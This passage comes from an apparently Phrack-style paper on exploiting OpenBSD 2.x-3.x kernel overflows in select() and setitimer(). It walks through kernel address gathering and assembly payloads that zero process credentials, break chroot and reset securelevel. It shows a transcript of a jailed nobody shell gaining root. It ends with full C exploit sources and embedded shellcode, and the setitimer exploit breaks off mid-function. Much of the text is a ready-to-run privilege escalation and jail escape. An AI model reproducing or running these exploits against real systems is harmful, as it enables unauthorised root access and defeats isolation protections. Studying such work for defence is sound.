code. Now we shall concentrate on other issues such as payload/shellcode
creation, symbol address gathering on run time, etc...


--[ 5 - How to gather offsets &amp; symbol addresses


Before considering what to achieve with kernel payload, I should remind you
about the previous questions that we raised which was how to return back to
user land, the proposed solution was basically to fix up %ebp, find out
where syscall() handler is in memory, plus where in syscall() we should be
returning. Payload is the obvious place to do the mentioned fix- ups but
this brings the complication of how to gather kernel addresses. After
dealing with some insufficient pre-exploitation techniques such like &#039;nm
/bsd&#039;, kvm_open() and nlist() system interfaces which are all lacking the
solution for non-reable (in terms of fs permissions) kernel image (/bsd).
I come to the conclusion that all address gathering should be done on run
time (in the execution state of the payload). Many win32 folks have been
doing this type of automation in shellcodes by walking through the thread
environment block (TEB) for some time. Also kernel structures such like the
process structure has to be supplied to the payload in order to achieve our
goals. Following sections would introduce the proposed solutions for kernel
space address gathering.


--[ 5.1 - sysctl() syscall


sysctl() system call will enable us to gather process structure information
which is needed for the credential and chroot manipulation payloads. In
this section we will take a brief look into the internals of the sysctl()
syscall.

sysctl is a system call to get and set kernel level information from user
land. It has a good interface to pass data from kernel to user land and
back. sysctl interface is structured into several sub components such as
the kernel, hardware, virtual memory, net, filesystem and architecure
system control interfaces. We&#039;ll concentrate on the kernel sysctl&#039;s which
is handled by the kern_sysctl()function. See: sys/kern/kern_sysctl.c:234
kern_sysctl() function also assigns different handlers to certain queries
such as proc structure, clockrate, vnode and file information. The process
structure is handled by the sysctl_doproc() function and this is the
interface to kernel land information that we are after!

int
sysctl_doproc(name, namelen, where, sizep)
        int *name;
        u_int namelen;
        char *where;
        size_t *sizep;
{

...

[1] for (; p != 0; p = LIST_NEXT(p, p_list)) {

...
[2]        switch (name[0]) {

                case KERN_PROC_PID:
                        /* could do this with just a lookup */
[3]                     if (p-&gt;p_pid != (pid_t)name[1])
                                continue;
                        break;

		...

	  }
		....

                if (buflen &gt;= sizeof(struct kinfo_proc)) {
[4]                     fill_eproc(p, &amp;eproc);
[5]                     error = copyout((caddr_t)p, &amp;dp-&gt;kp_proc,
                                        sizeof(struct proc));
....


void
fill_eproc(p, ep)
        register struct proc *p;
        register struct eproc *ep;
{
        register struct tty *tp;

[6]        ep-&gt;e_paddr = p;


Also for sysctl_doproc() there can be different types of queries which are
handled by the switch [2] statement. KERN_PROC_PID is the query that is
sufficient enough to gather the needed address about any process&#039;s proc
structure. For the select() overflow it was sufficient enough just to
gather the parent process&#039;s proc address but the setitimer() vulnerability
make use of the sysctl() interface in many different ways (more on this
later).

sysctl_doproc() code iterates through [1] the linked list of proc
structures in order to find the queried pid [3], and, if found, certain
structures (eproc &amp; kp_proc) get filled-in [4], [5] and copyout to user
land. fill_eproc() (called  from [4]) does the trick [6] and copies the
proc address of the queried pid into the e_paddr member of the eproc
structure, which, in turn, was eventually copied out to user land in the
kinfo_proc structure (which is the main data structure for the
sysctl_doproc() function). For further information on members of these
structures see: sys/sys/sysctl.h.

The following is the function we&#039;ll be using to retrieve the kinfo_proc
structure:

void
get_proc(pid_t pid, struct kinfo_proc *kp)
{
   u_int arr[4], len;
        
        arr[0] = CTL_KERN;
        arr[1] = KERN_PROC;
        arr[2] = KERN_PROC_PID;
        arr[3] = pid;
        len = sizeof(struct kinfo_proc);
        if(sysctl(arr, 4, kp, &amp;len, NULL, 0) &lt; 0) {
                perror(&quot;sysctl&quot;);
                exit(-1);
        }
         
}


It is a pretty straightforward interface, what happens is: CTL_KERN will be
dispatched to kern_sysctl() by sys_sysctl() KERN_PROC will be dispatched to
sysctl_doproc() by kern_sysctl() KERN_PROC_PID will be handled by the
aforementioned switch statement, eventually returning the kinfo_proc
structure.

&lt;rant&gt;
sysctl() system call might be there with all good intensions such as
getting and setting kernel information in a dynamic fashion. However, from
a security point of view, I believe sysctl() syscall should not be blindly
giving proc information about any queried pid. Credential checks should be
added in proper places, especially for the systcl_doproc() interface ...
&lt;/rant&gt;


--[ 5.2 - sidt technique &amp; _kernel_text search


As mentioned before, we are after transparent payload execution so that
_sys_select() will actually return to its caller _syscall() as expected.  I
will explain how to gather the return path in this section. The solution
depends on the idtr (interrupt descriptor table register) that contains a
fixed location address, which is the start of the Interrupt Descriptor
Table (IDT).

Without going into too many details, IDT is the table that holds the
interrupt handlers for various interrupt vectors. Each interrupt in x86 is
represented by a number in the range 0 - 255 and these numbers are called
the interrupt vectors. These vectors are used to locate the initial handler
for any given interrupt inside the IDT. IDT contains 256 entries, each
being 8 bytes. IDT descriptor entries can be 3 different types but we will
concentrate only on the gate descriptor:

sys/arch/i386/include/segment.h:99

struct gate_descriptor {
        unsigned gd_looffset:16;        /* gate offset (lsb) */
        unsigned gd_selector:16;        /* gate segment selector */
        unsigned gd_stkcpy:5;           /* number of stack wds to cpy */
        unsigned gd_xx:3;               /* unused */
        unsigned gd_type:5;             /* segment type */
        unsigned gd_dpl:2;              /* segment descriptor priority 
level */
        unsigned gd_p:1;                /* segment descriptor present */
        unsigned gd_hioffset:16;        /* gate offset (msb) */
}

gate_descriptor&#039;s members gd_looffset and gd_hioffset will form the low
level interrupt handler&#039;s address. For more information on the various
fields, reader should consult to the architecture manuals [Intel]. 

System call interface to request kernel services is implemented through the
software initiated interrupt: 0x80. Armored with this knowledge, starting
from the address of the low level syscall interrupt handler and walking
through the kernel text, we can find our way to the high level syscall
handler and finally return to it. 

Interrupt descriptor table under OpenBSD is named _idt_region and slot
number: 0x80 is the gate descriptor for the system call interrupt &#039;int
0x80&#039;. Since every member is 8 bytes, system call gate_descriptor is at
address &#039;_idt_region + 0x80 * 0x8&#039; which is &#039;_idt_region + 0x400&#039;. 

bash-2.05a# Stopped at		_Debugger+0x4: leave
ddb&gt; x/x _idt_region+0x400
_idt_region+0x400:	80e4c
ddb&gt; ^M
_idt_region+0x404:	e010ef00

To figure out the initial syscall handler we need to do the proper &#039;shift&#039;
and &#039;or&#039; operations on the gate descriptor bit fields, which leads to the
0xe0100e4c kernel address.

bash-2.05a# Stopped at          _Debugger+0x4: leave
ddb&gt; x/x 0xe0100e4c
_Xosyscall_end:	pushl	$0x2
ddb&gt; ^M
_Xosyscall_end+0x2:	pushl	$0x3
...
...
_Xosyscall_end+0x20:	call	_syscall
...

As per exception or software initiated interrupt, the corresponding vector
is found in the IDT and the execution is redirected to the handler gathered
from the gate descriptor. This is an intermediate handler and will
eventually take us to real handler. As seen at the kernel debugger output,
the initial handler _Xosyscall_end saves all registers (also some other low
level stuff) and immediately calls the real handler which is _syscall().

We have mentioned that the idtr register always contains the address of the
_idt_region, here is the way to access its content:

sidt 0x4(%edi)
mov  0x6(%edi),%ebx  

Address of the _idt_region is moved to ebx and IDT can now be referenced
via ebx. Assembly code to gather the syscall handler starting from the
initial handler is as follows;

sidt 0x4(%edi)
mov  0x6(%edi),%ebx     # mov _idt_region is in ebx
mov  0x400(%ebx),%edx   # _idt_region[0x80 * (2*sizeof long) = 0x400]
mov  0x404(%ebx),%ecx   # _idt_region[0x404]
shr  $0x10,%ecx	        #
sal  $0x10,%ecx	        # ecx = gd_hioffset
sal  $0x10,%edx	        #
shr  $0x10,%edx         # edx = gd_looffset
or   %ecx,%edx          # edx = ecx | edx  =  _Xosyscall_end

At this stage we have successfully found the initial/intermediate handler&#039;s
location, so the next step is to search through the kernel text, find &#039;call
_syscall&#039;, gather the displacement of the call instruction and add it to
the address of the instruction&#039;s location. Also plus 5 should be added to
the displacement for the size of the call instruction.

xor  %ecx,%ecx          # zero out the counter
up:
inc  %ecx
movb (%edx,%ecx),%bl    # bl =  _Xosyscall_end++
cmpb $0xe8,%bl          # if bl == 0xe8 : &#039;call&#039;
jne  up

lea  (%edx,%ecx),%ebx   # _Xosyscall_end+%ecx: call _syscall
inc  %ecx
mov  (%edx,%ecx),%ecx   # take the displacement of the call ins.
add  $0x5,%ecx          # add 5 to displacement
add  %ebx,%ecx          # ecx = _Xosyscall_end+0x20 + disp = _syscall()

At this stage %ecx holds the address of the real handler _syscall(). The
next step is to find out where to return inside the syscall() function
which eventually leads to a broader research on various versions of OpenBSD
with various kernel compilation options. Luckily, it turns out to be safe
to search for the &#039;call *%eax&#039; instruction inside the _syscall(), because
this turns out to be the instruction that dispatches every system call to
its final handler in every OpenBSD version I have tested.

For OpenBSD 2.6 through 3.1 kernel code always dispatched the system calls
with the &#039;call *%eax&#039; instruction, which is unique in the scope of
_syscall() function.

bash-2.05a# Stopped at          _Debugger+0x4: leave
ddb&gt; x/i _syscall+0x240
_syscall+0x240:	call	*%eax
ddb&gt;cont

Our goal is now to figure out the offset (0x240 in the above disasm) for
any kernel version so that we can return to the instruction just after it
from our payload and achieve our goal. The code to search for &#039;call *%eax&#039;
is as follows:

# _syscall+0x240: ff
# _syscall+0x241: d0    0x240-&gt;0x241 OBSD3.1

mov  %ecx,%edi         # ecx is the addr of _syscall 
movw $0xd0ff,%ax       # search for ffd0 &#039;call *%eax&#039;
cld
mov  $0xffffffff,%ecx
repnz
scasw                  # scan (%edi++) for %ax

# %edi gets incremented one last time before breaking the loop
# %edi contains the instruction address just after &#039;call *%eax&#039; 
# so return to it!!!

xor  %eax,%eax         #set up the return value = Success ;)

push %edi              # push %edi on the stack and return to it
ret


Finally, this is all we needed for a clean return. This payload can be used
for any syscall overflow without requiring any further modification.
 

--[ 5.3 - _db_lookup() technique 


This technique introduces no new concepts; it is just another kernel text
search to find out the address of _db_lookup() -- the kernel land
equivalent of dlsym(). The search is based on the function fingerprint,
which is fairly safe on the recent versions on which the code has been
developed, but it might not work on the older versions. I choose to keep it
out of the text for brevity&#039;s sake but it&#039;s exact the same &#039;repnz scas&#039;
concept just used in the idtr technique. (for sample code, contact me.)

 
--[ 5.4 - /usr/bin/nm, kvm_open(), nlist()


/usr/bin/nm, kvm library and nlist() library interface can all be used to
gather kernel land symbols and offsets but, as we already mentioned, they
all require a readable kernel image and/or additional privileges which in
most secured systems are not usually avaliable.

Furthermore, the most obvious problem with these interfaces are that they
won&#039;t work at all in chroot()ed environments with no privileges (nobody).
These are the main reasons I have not used these techniques within the
exploitation phase of privilege escalation and chroot breaking, but after
establishing full control over the system (uid = 0 and out of jail), I have
made use of offline binary symbol gathering in order to reset the
securelevel, more about this later.


--[ 5.5 - %ebp fixup


After taking care of the saved return address, we need to fix %ebp to
prevent crashes in later stages (especially in _syscall() code). The proper
way to calculate %ebp is to find out the difference between the stack
pointer and the saved base pointer at the procedure exit and used this
static number to restore %ebp. For all the versions of OpenBSD 2.6 through
3.1 this difference was 0x68 bytes. You can simply set a breakpoint on
_sys_select prolog and another one just before the &#039;leave&#039; instruction at
the epilog and calculate the difference between the %ebp recorded at the
prolog and the %esp recorded just before the epilog.

lea  0x68(%esp),%ebp # fixup ebp

Above instruction would be enough to set the %ebp back to its old value.


--[ 6 - Payload/Shellcode Creation


In the following sections we&#039;ll develop small payloads that modify certain
fields of its parent process&#039; proc structure to achieve elevated privileges
and break out of chroot/jail environments. Then, we&#039;ll chain the developed
assembly code with the sidt code to work our way back to user land and
enjoy our new privileges.


--[ 6.1 - What to achieve


Setting up a jail with nobody privileges and trying to break out of it
seems like a fairly good goal to achieve. Since all these privilege
separation terms are brought into OpenBSD with the latest OpenSSH, it would
be nice to actually demonstrate how trivial it would be to bypass this kind
of &#039;protection&#039; by way of such kernel level vulnerabilities.

Certain inetd.conf services and OpenSSH are run as nobody/user in a
chrooted/jailed environment -- intended to be an additional assurance of
security. This is a totally false sense of security; jailme.c code follows:

jailme.c:

#include &lt;stdio.h&gt;

int
main()
{
        chdir(&quot;/var/tmp/jail&quot;);
        chroot(&quot;/var/tmp/jail&quot;);
        setgroups(NULL, NULL);
        setgid(32767);
        setegid(32767);
        setuid(32767);
        seteuid(32767);
        execl(&quot;/bin/sh&quot;, &quot;jailed&quot;, NULL);
}

bash-2.05a# gcc -o jailme jailme.c
bash-2.05a# cp jailme /tmp/jailme
bash-2.05a# mkdir /var/tmp/jail
bash-2.05a# mkdir /var/tmp/jail/usr
bash-2.05a# mkdir /var/tmp/jail/bin /var/tmp/jail/usr/lib
bash-2.05a# mkdir /var/tmp/jail/usr/libexec
bash-2.05a# cp /bin/sh /var/tmp/jail/bin/
bash-2.05a# cp /usr/bin/id /var/tmp/jail/bin/
bash-2.05a# cp /bin/ls /var/tmp/jail/bin/
bash-2.05a# cp /usr/lib/libc.so.28.3 /var/tmp/jail/usr/lib/
bash-2.05a# cp /usr/libexec/ld.so /var/tmp/jail/usr/libexec/
bash-2.05a# cat &gt;&gt; /etc/inetd.conf 
1024            stream  tcp     nowait  root    /tmp/jailme
^C
bash-2.05a# ps aux | grep inetd
root     19121  0.0  1.1   148   352 p0  S+     8:19AM    0:00.05 grep 
inetd 
root     27152  0.0  1.1    64   348 ??  Is     6:00PM    0:00.08 inetd 
bash-2.05a# kill -HUP 27152
bash-2.05a# nc -v localhost 1024
Connection to localhost 1024 port [tcp/*] succeeded!
ls -l /
total 4
drwxr-xr-x  2 0  0  512 Dec  9 16:23 bin
drwxr-xr-x  4 0  0  512 Dec  9 16:21 usr
id
uid=32767 gid=32767
ps
jailed: &lt;stdin&gt;[4]: ps: not found
....


--[ 6.2 - The payload


Throughout this section we will introduce all the tiny bits of the complete
payload. So all these section chained together will form the eventual
payload, which will be available at the code section (10) of this paper.


--[ 6.2.1 - p_cred &amp; u_cred


We&#039;ll start with the privilege elevation section of the payload. Following
is the payload to update ucred (credentials of user) and pcred (credentials
of the process) of any given proc structure. Exploit code fills in the proc
address of its parent process by using the sysctl() system call (discussed
on 5.1) replacing .long 0x12345678. The following &#039;call&#039; and &#039;pop&#039;
instructions will load the address of the given proc structure address into
%edi. The typical address gathering technique used in almost every PIC
%shellcode [ALEPH1].

call moo
.long 0x12345678   &lt;-- pproc addr
.long 0xdeadcafe
.long 0xbeefdead
nop
nop
nop
moo:
pop  %edi
mov  (%edi),%ecx      # parent&#039;s proc addr in ecx

		      # update p_ruid
mov  0x10(%ecx),%ebx  # ebx = p-&gt;p_cred
xor  %eax,%eax        # eax = 0
mov  %eax,0x4(%ebx)   # p-&gt;p_cred-&gt;p_ruid = 0

	              # update cr_uid
mov  (%ebx),%edx      # edx = p-&gt;p_cred-&gt;pc_ucred
mov  %eax,0x4(%edx)   # p-&gt;p_cred-&gt;pc_ucred-&gt;cr_uid = 0


--[ 6.2.2 - chroot breaking


Next tiny assembly fragment will be the chroot breaker of our complete
payload.

Without going into extra detail (time is running out, deadline is within 3
days ;)), lets take a brief look of how chroot is checked on a per-process
basis. chroot jails are implemented by filling in the fd_rdir member of the
filedesc (open files structure) with the desired jail directories vnode
pointer. When kernel is giving certain services to any process, it checks
for the existence of this pointer and if it&#039;s filled with a vnode that
process is handled slightly different and kernel will create the notion of
a new root directory for this process thus jailing it into a predefined
directory. For a regular process this pointer is zero / unset.  So without
any further need to go into implementation level details, just setting this
pointer to NULL means FREEDOM! fd_rdir is referenced through the proc
structure as follows:

p-&gt;p_fd-&gt;fd_rdir 

As with the credentials structure, filedesc is also trivial to access and
alter, with only 2 instruction additions to our payload.

# update p-&gt;p_fd-&gt;fd_rdir to break chroot()

mov  0x14(%ecx),%edx  	# edx = p-&gt;p_fd
mov  %eax,0xc(%edx)   	# p-&gt;p_fd-&gt;fd_rdir = 0


--[ 6.2.3 - securelevel  


OpenBSD has 4 different securelevels starting from permanently insecure to
highly secure mode. The system by default runs at level 1 which is the
secure mode. Secure mode restrictions are as follows:

-   securelevel may no longer be lowered except by init
-   /dev/mem and /dev/kmem may not be written to
-   raw disk devices of mounted file systems are read-only
-   system immutable and append-only file flags may not be removed
-   kernel modules may not be loaded or unloaded

Some of these restrictions might complicate further compromise of the
system. So we should also take care of the securelevel flag and reset it to
0, which is the insecure level that gives you privileges such as being able
to load kernel modules to further penetrate the system.

But there were many problems in run time searching of the address of
securelevel in memory without false positives so I chose to utilize this
attack at a later stage. The stage that we get uid 0 and break free out of
jail, now we have all the interfaces available mentioned in section 5.4 to
query any kernel symbol and retrieve its address.

bash-2.05a# /usr/bin/nm /bsd | grep securelevel
e05cff38 B _securelevel

For this reason an additional, second stage exploit was crafted (without
any difference, other then the payload) that executes the following
assembly routine and returns to user land, using the idtr technique. See
ex_select_obsd_secl.c in section 10

call moo
.long 0x12345678     &lt;-- address of securelevel filled by user
moo:
pop  %edi
mov  (%edi),%ebx      # address of securelevel in ebx
		      # reset security level to 0/insecure
xor  %eax,%eax        # eax = 0
mov  %eax,(%ebx)      # securelevel = 0

... 


--[ 6.3 - Get root &amp; escape jail


All of the above chained into 2 piece of exploit code. Here is the door to
freedom! (Exploits and payloads can be found in section 10)

bash-2.05a# gcc -o ex ex_select_obsd.c
bash-2.05a# gcc -o ex2 ex_select_obsd_secl.c
bash-2.05a# cp ex /var/tmp/jail/
bash-2.05a# cp ex2 /var/tmp/jail/
bash-2.05a# nc -v localhost 1024
id
uid=32767 gid=32767
ls /
bin
ex
ex2
usr
./ex


[*] OpenBSD 2.x - 3.x select() kernel overflow     [*]
[*] by    Sinan &quot;noir&quot; Eren  -  noir@olympos.org   [*]


userland: 0x0000df38 parent_proc: 0xe46373a4
id
uid=0(root) gid=32767(nobody)
uname -a
OpenBSD kernfu 3.1 GENERIC#59 i386
ls /
.cshrc
.profile
altroot
bin
boot
bsd
dev
etc
...
sysctl kern.securelevel
kern.securelevel = 1
nm /bsd | grep _securelevel
e05cff38 B _securelevel
./ex2 e05cff38
sysctl kern.securelevel
kern.securelevel = 0

... ;)

Directly copying the exploit into the jailed environment might seem a bit
unrealistic but it really is not an issue with system call redirection
[MAXIMI] or even by using little more imaginative shellcodes, you can
execute anything from a remote source without any further need for a shell
interpreter. To the best of my knowledge there is 2 commercial products
that have already achieved such remote execution simulations. [IMPACT],
[CANVAS]


--[ 7 - Conclusions


My goal in writing this paper was try to prove kernel land vulnerabilities
such as stack overflows and integer conditions can be exploited and lead to
total control over the system, no matter how strict your user land (i.e.,
privilege separation) or even kernel land (i.e., chroot, systrace,
securelevel) enforcements are ... I also tried to contribute to the newly
raised concepts (greets to Gera) of fail-safe and reusable exploitation
code generation.

I would like to end this article with my favorite vuln-dev posting of all
time:

Subject:   RE: OpenSSH Vulns (new?) Priv seperation
[...]
reducing root-run code from 27000 to 2500 lines is the important part.
who cares how many holes there are when it is in /var/empty/sshd chroot
with no possibility of root :)

XXXXX

[ I CARE. lol! ;)]


--[ 8 - Greetings


Thanks to Dan and Dave for correcting my English and committing many logic
fixes. Thanks to certain anonymous people for their help and support.

Greets to: optyx, dan, dave aitel, gera, bind, jeru, #convers
uberhax0r, olympos and gsu.linux ppl

Most thanks of all to goes to Asli for support, help and her never-ending
affection. Seni Seviyorum, mosirrr!!


--[ 9 -	References


- [ESA]     	Exploiting Kernel Buffer Overflows FreeBSD Style
		http://online.securityfocus.com/archive/1/153336

- [LSD-PL]	Kernel Level Vulnerabilities, 5th Argus Hacking Challenge
		http://lsd-pl.net/kernel_vulnerabilities.html

- [4.4 BSD]	The Design and Implementation of the 4.4BSD Operating
		System

- [Intel]	Intel Pentium 4 Processors Manuals
		http://developer.intel.com/design/Pentium4/manuals/

- [ALEPH1]	Smashing The Stack For Fun And Profit
		http://www.phrack.org/show.php?p=49&amp;a=14

- [MAXIMI]	Syscall Proxying - Simulating Remote Execution
		http://www.corest.com/files/files/13/BlackHat2002.pdf

- [IMPACT]	http://www.corest.com/products/coreimpact/index.php

- [CANVAS]	http://www.immunitysec.com/CANVAS

- [ODED]	Big Loop Integer Protection
		Phrack #60 0x09 by Oded Horovitz

--[ 10 - Code


&lt;++&gt; ./ex_kernel/ex_select_obsd.c
/** 
 ** OpenBSD 2.x 3.x select() kernel bof exploit
 ** Sinan &quot;noir&quot; Eren 
 ** noir@olympos.org | noir@uberhax0r.net
 ** (c) 2002 
 **
 **/   

#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/time.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/param.h&gt;
#include &lt;sys/sysctl.h&gt;
#include &lt;sys/signal.h&gt;
#include &lt;sys/utsname.h&gt;
#include &lt;sys/stat.h&gt;

/* kernel_sc.s shellcode */ 
unsigned char shellcode[] = 
&quot;\xe8\x0f\x00\x00\x00\x78\x56\x34\x12\xfe\xca\xad\xde\xad\xde\xef\xbe&quot;
&quot;\x90\x90\x90\x5f\x8b\x0f\x8b\x59\x10\x31\xc0\x89\x43\x04\x8b\x13\x89&quot;
&quot;\x42\x04\x8b\x51\x14\x89\x42\x0c\x8d\x6c\x24\x68\x0f\x01\x4f\x04\x8b&quot;
&quot;\x5f\x06\x8b\x93\x00\x04\x00\x00\x8b\x8b\x04\x04\x00\x00\xc1\xe9\x10&quot;
&quot;\xc1\xe1\x10\xc1\xe2\x10\xc1\xea\x10\x09\xca\x31\xc9\x41\x8a\x1c\x0a&quot;
&quot;\x80\xfb\xe8\x75\xf7\x8d\x1c\x0a\x41\x8b\x0c\x0a\x83\xc1\x05\x01\xd9&quot;
&quot;\x89\xcf\x66\xb8\xff\xd0\xfc\xb9\xff\xff\xff\xff\xf2\x66\xaf\x31\xc0&quot;
&quot;\x57\xc3&quot;;

void sig_handler();
void get_proc(pid_t, struct kinfo_proc *);

int
main(int argc, char **argv)
{
   char *buf, *ptr, *fptr;
   u_long pgsz, *lptr, pprocadr;
   struct kinfo_proc kp;

  printf(&quot;\n\n[*] OpenBSD 2.x - 3.x select() kernel overflow   [*]\n&quot;);
  printf(&quot;[*] by  Sinan \&quot;noir\&quot; Eren  -  noir@olympos.org  [*]\n&quot;);
  printf(&quot;\n\n&quot;); sleep(1);

  	 pgsz = sysconf(_SC_PAGESIZE);  
	 fptr = buf = (char *) malloc(pgsz*4);
	 if(!buf) { 
		    perror(&quot;malloc&quot;); 
		    exit(-1);
		 }
	 memset(buf, 0x41, pgsz*4);

	buf = (char *) (((u_long)buf &amp; ~pgsz) + pgsz);

	get_proc((pid_t) getppid(), &amp;kp);
	pprocadr = (u_long) kp.kp_eproc.e_paddr;

	ptr = (char *) (buf + pgsz - 200); /* userland adr */
	lptr = (long *) (buf + pgsz - 8);

	*lptr++ = 0x12345678; /* saved %ebp */
	*lptr++ = (u_long) ptr; /*(uadr + 0x1ec0);  saved %eip */

	shellcode[5] = pprocadr &amp; 0xff;
	shellcode[6] = (pprocadr &gt;&gt; 8) &amp; 0xff;
	shellcode[7] = (pprocadr &gt;&gt; 16) &amp; 0xff;
	shellcode[8] = (pprocadr &gt;&gt; 24) &amp; 0xff;

	memcpy(ptr, shellcode, sizeof(shellcode)-1);

        printf(&quot;userland: 0x%.8x &quot;, ptr);	
	printf(&quot;parent_proc: 0x%.8x\n&quot;, pprocadr);

	if( mprotect((char *) ((u_long) buf + pgsz), (size_t)pgsz,
						 PROT_WRITE) &lt; 0) {
		perror(&quot;mprotect&quot;);	
		exit(-1);
	}

	signal(SIGSEGV, (void (*)())sig_handler);
	select(0x80000000, (fd_set *) ptr, NULL, NULL, NULL);

done:	
	free(fptr);	
}	

void
sig_handler()
{
   exit(0);
}

void
get_proc(pid_t pid, struct kinfo_proc *kp)
{
   u_int arr[4], len;

        arr[0] = CTL_KERN;
        arr[1] = KERN_PROC;
        arr[2] = KERN_PROC_PID;
        arr[3] = pid;
        len = sizeof(struct kinfo_proc);
        if(sysctl(arr, 4, kp, &amp;len, NULL, 0) &lt; 0) {
                perror(&quot;sysctl&quot;);
                fprintf(stderr, &quot;this is an unexpected error, rerun!\n&quot;);
                exit(-1);
        }

}
&lt;--&gt; ./ex_kernel/ex_select_obsd.c
&lt;++&gt; ./ex_kernel/ex_select_obsd_secl.c
/** 
 ** OpenBSD 2.x 3.x select() kernel bof exploit
 **
 ** securelevel reset exploit, this is the second stage attack
 **
 ** Sinan &quot;noir&quot; Eren 
 ** noir@olympos.org | noir@uberhax0r.net
 ** (c) 2002 
 **
 **/   

#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/time.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/param.h&gt;
#include &lt;sys/signal.h&gt;
#include &lt;sys/utsname.h&gt;
#include &lt;sys/stat.h&gt;

/* sel_sc.s shellcode */
unsigned char shellcode[] = 
&quot;\xe8\x04\x00\x00\x00\x78\x56\x34\x12\x5f\x8b\x1f\x31\xc0\x89\x03\x8d&quot;
&quot;\x6c\x24\x68\x0f\x01\x4f\x04\x8b\x5f\x06\x8b\x93\x00\x04\x00\x00\x8b&quot;
&quot;\x8b\x04\x04\x00\x00\xc1\xe9\x10\xc1\xe1\x10\xc1\xe2\x10\xc1\xea\x10&quot;
&quot;\x09\xca\x31\xc9\x41\x8a\x1c\x0a\x80\xfb\xe8\x75\xf7\x8d\x1c\x0a\x41&quot;
&quot;\x8b\x0c\x0a\x83\xc1\x05\x01\xd9\x89\xcf\x66\xb8\xff\xd0\xfc\xb9\xff&quot;
&quot;\xff\xff\xff\xf2\x66\xaf\x31\xc0\x57\xc3&quot;;

void sig_handler();

int
main(int argc, char **argv)
{
   char *buf, *ptr, *fptr;
   u_long pgsz, *lptr, secladr;

	if(!argv[1]) {
	printf(&quot;Usage: %s secl_addr\nsecl_addr: /usr/bin/nm /bsd |&quot;
       	&quot; grep _securelevel\n&quot;, argv[0]);
	exit(0);
	}

	secladr = strtoul(argv[1], NULL, 16);

  	 pgsz = sysconf(_SC_PAGESIZE);  
	 fptr = buf = (char *) malloc(pgsz*4);
	 if(!buf) { 
		    perror(&quot;malloc&quot;); 
		    exit(-1);
		 }
	 memset(buf, 0x41, pgsz*4);

	buf = (char *) (((u_long)buf &amp; ~pgsz) + pgsz);

	ptr = (char *) (buf + pgsz - 200); /* userland adr */
	lptr = (long *) (buf + pgsz - 8);

	*lptr++ = 0x12345678; /* saved %ebp */
	*lptr++ = (u_long) ptr; /*(uadr + 0x1ec0);  saved %eip */

	shellcode[5] = secladr &amp; 0xff;
	shellcode[6] = (secladr &gt;&gt; 8) &amp; 0xff;
	shellcode[7] = (secladr &gt;&gt; 16) &amp; 0xff;
	shellcode[8] = (secladr &gt;&gt; 24) &amp; 0xff;

	memcpy(ptr, shellcode, sizeof(shellcode)-1);

	if( mprotect((char *) ((u_long) buf + pgsz), (size_t)pgsz,
					 PROT_WRITE) &lt; 0) {
		perror(&quot;mprotect&quot;);	
		exit(-1);
	}

	signal(SIGSEGV, (void (*)())sig_handler);
	select(0x80000000, (fd_set *) ptr, NULL, NULL, NULL);

done:	
	free(fptr);	
}	

void
sig_handler()
{
   exit(0);
}
&lt;--&gt; ./ex_kernel/ex_select_obsd_secl.c
&lt;++&gt; ./ex_kernel/ex_setitimer_obsd.c
/**
 ** OpenBSD 2.x 3.x setitimer() kernel memory write exploit 
 ** Sinan &quot;noir&quot; Eren
 ** noir@olympos.org | noir@uberhax0r.net
 ** (c) 2002
 **
 **/

#include &lt;stdio.h&gt;
#include &lt;sys/param.h&gt;
#include &lt;sys/proc.h&gt;
#include &lt;sys/time.h&gt;
#include &lt;sys/sysctl.h&gt;


struct itimerval val, oval;
int which = 0;

int
main(int argc, char **argv)
{
   find_which();
   setitimer(which, &amp;val, &amp;oval);
   seteuid(0);
   setuid(0);
   printf(&quot;uid: %d euid: %d gid: %d \n&quot;, getuid(), geteuid(), getgid());
   execl(&quot;/bin/sh&quot;, &quot;noir&quot;, NULL);
}

find_which()
{
   unsigned int arr[4], len;
   struct kinfo_proc kp;
   long stat, cred, rem;

	memset(&amp;val, 0x00, sizeof(val));
	val.it_interval.tv_sec = 0x00;  //fill this with cr_ref
	val.it_interval.tv_usec = 0x00;
	val.it_value.tv_sec = 0x00;
	val.it_value.tv_usec = 0x00;

	arr[0] = CTL_KERN;
	arr[1] = KERN_PROC;
	arr[2] = KERN_PROC_PID;
	arr[3] = getpid();
	len = sizeof(struct kinfo_proc);
	if(sysctl(arr, 4, &amp;kp, &amp;len, NULL, 0) &lt; 0) {
		perror(&quot;sysctl&quot;);
		fprintf(stderr, &quot;this is an unexpected error, rerun!\n&quot;);
		exit(-1);
	}

	printf(&quot;proc: %p\n\n&quot;, (u_long) kp.kp_eproc.e_paddr);
	printf(&quot;pc_ucred: %p &quot;, (u_long) kp.kp_eproc.e_pcred.pc_ucred);

	printf(&quot;p_ruid: %d\n\n&quot;, (u_long) kp.kp_eproc.e_pcred.p_ruid);
	printf(&quot;proc-&gt;p_cred-&gt;p_ruid: %p, proc-&gt;p_stats: %p\n&quot;, 
	(char *) (kp.kp_proc.p_cred) + 4, kp.kp_proc.p_stats);
        printf(&quot;cr_ref: %d\n&quot;, (u_long) kp.kp_eproc.e_ucred.cr_ref);
	
	cred = (long) kp.kp_eproc.e_pcred.pc_ucred;	
	stat = (long) kp.kp_proc.p_stats;
	val.it_interval.tv_sec = kp.kp_eproc.e_ucred.cr_ref;
	
	printf(&quot;calculating which for u_cred:\n&quot;);
	which = cred - stat - 0x90;
	rem = ((u_long)which%0x10);
	printf(&quot;which: %.8x reminder: %x\n&quot;, which, rem);

	switch(rem) {
	case 0x8:
	case 0x4:
	case 0xc:
         break;
	case 0x0:
	 printf(&quot;using u_cred, we will have perminent euid=0\n&quot;);
	 goto out;
	} 
			
	val.it_interval.tv_sec = 0x00;
	cred = (long) ((char *) kp.kp_proc.p_cred+4);
	stat = (long) kp.kp_proc.p_stats;

	printf(&quot;calculating which for u_cred:\n&quot;);
	which = cred - stat - 0x90;	
	rem = ((u_long)which%0x10);
	printf(&quot;which: %.8x reminder: %x\n&quot;, which, rem);

	switch(rem) {
	case 0x8:
	case 0x4:
	 printf(&quot;too bad rem is fucked!\nlet me know about this!!\n&quot;); 
         exit(0);
	case 0x0:
	 break;
	case 0xc:
	 which += 0x10;
	} 
	printf(&quot;\nusing p_cred instead of u_cred, only the new process &quot;
	       &quot;will be priviliged\n&quot;);

out:
